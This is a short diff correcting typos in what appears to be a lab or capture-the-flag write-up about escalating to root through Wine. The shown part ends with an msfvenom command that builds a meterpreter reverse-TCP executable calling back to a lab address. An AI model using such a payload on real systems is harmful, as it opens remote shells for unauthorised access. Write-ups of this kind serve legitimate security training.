@@ -89,9 +89,9 @@ Wine (originally an acronym for "Wine Is Not an Emulator") is a compatibility la
 
 I checked GTFObins for any way to exploit this, but found nothing.  A quick google search turned up the following page:
 
-[exploit_wine_with_msfvenom](https://www.hacknos.com/wine-privilege-escalation/)
+[exploit wine with msfvenom](https://www.hacknos.com/wine-privilege-escalation/)
 
-Turns out I could pass a malicious `exe` file to win to gain a root shell.  Lets give it a go.  First I had to generate a malicious payload with msfvenom:
+Turns out I could pass a malicious `exe` file to wine to gain a root shell.  Lets give it a go.  First I had to generate a malicious payload with msfvenom:
 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp lhost=10.0.2.15 lport=4545 -f exe >meisty.exe
